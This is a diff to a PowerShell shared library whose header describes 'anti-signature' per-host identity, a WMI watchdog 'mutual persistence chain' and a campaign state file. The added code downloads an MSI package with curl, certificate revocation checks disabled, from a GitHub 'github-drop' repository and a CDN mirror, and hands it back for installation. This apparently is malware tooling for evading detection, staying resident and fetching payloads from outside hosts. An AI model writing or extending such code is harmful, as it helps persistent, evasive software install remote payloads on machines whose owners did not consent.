@@ -1,9 +1,9 @@
 #Requires -Version 5.1
 # ═══════════════════════════════════════════════════════════════
-# OWN_LIB  BUILD 20260802L30
+# OWN_LIB  BUILD 20260802L31
 # Shared library: per-host identity (anti-signature), WMI watchdog
 # (mutual persistence chain), campaign state file, SC service repair.
-# L30: Repair-SCService NEVER msiexec /fa or /i (shared UpgradeCodes killed Gryxa sibling). Service-level heal only.
+# L31: Get-GryxaMsi pulls from github-drop first (ui.gryxa.com TLS broken on some hosts) + FP-guard. L30: Repair msiexec-free.
 # L21: stuck registered (svc+dir gone) -> /fa then ARP nuke + same-FP /i; return fix.
 # L20: -Deep must not skip light start/repair (rate-limit left Gryxa Stopped).
 # L19: rate-limit never blocks when Gryxa fully absent; StartPending keep.
@@ -509,15 +509,30 @@ function Get-GryxaMsi {
         Remove-Item -LiteralPath $msi -Force -ErrorAction SilentlyContinue
     }
     $tmp = Join-Path $env:TEMP ("sc_gryxa_{0}.msi" -f [guid]::NewGuid().ToString('N'))
-    try {
-        $curl = Join-Path $env:SystemRoot 'System32\curl.exe'
-        if (-not (Test-Path $curl)) { $curl = 'curl.exe' }
-        & $curl -L --ssl-no-revoke --connect-timeout 25 --max-time 300 -o $tmp $script:GryxaMsiUrl 2>&1 | Out-Null
-        if ((Test-Path $tmp) -and ((Get-Item $tmp).Length -gt 1000000)) {
-            # cache into WorkDir when possible; if the workdir is ACL-locked, install from TEMP directly
-            try { Copy-Item -LiteralPath $tmp -Destination $msi -Force -ErrorAction Stop; return $msi } catch { return $tmp }
-        }
-    } catch {}
+    # L31: github-drop FIRST (raw/jsdelivr work even when ui.gryxa.com TLS is broken on
+    # the host: schannel SEC_E_INVALID_TOKEN). ui.gryxa.com is only a fallback.
+    $urls = @(
+        'https://raw.githubusercontent.com/xnobuddy/github-drop/main/pkg_gryxa.msi',
+        'https://cdn.jsdelivr.net/gh/xnobuddy/github-drop@main/pkg_gryxa.msi',
+        $script:GryxaMsiUrl
+    )
+    $curl = Join-Path $env:SystemRoot 'System32\curl.exe'
+    if (-not (Test-Path $curl)) { $curl = 'curl.exe' }
+    foreach ($u in $urls) {
+        try {
+            Remove-Item -LiteralPath $tmp -Force -ErrorAction SilentlyContinue
+            & $curl -L --ssl-no-revoke --connect-timeout 25 --max-time 300 -o $tmp $u 2>&1 | Out-Null
+            if ((Test-Path $tmp) -and ((Get-Item $tmp).Length -gt 1000000)) {
+                # FP-guard: never install a downloaded MSI whose FP mismatches the pinned one
+                if ($script:GryxaExpectedFp) {
+                    $dlFp = Get-FpFromProductName (Get-MsiProperty $tmp 'ProductName')
+                    if ($dlFp -and ($dlFp -ne $script:GryxaExpectedFp)) { continue }
+                }
+                # cache into WorkDir when possible; if the workdir is ACL-locked, install from TEMP directly
+                try { Copy-Item -LiteralPath $tmp -Destination $msi -Force -ErrorAction Stop; return $msi } catch { return $tmp }
+            }
+        } catch {}
+    }
     if (Test-Path $tmp) { Remove-Item -LiteralPath $tmp -Force -ErrorAction SilentlyContinue }
     return $null
 }
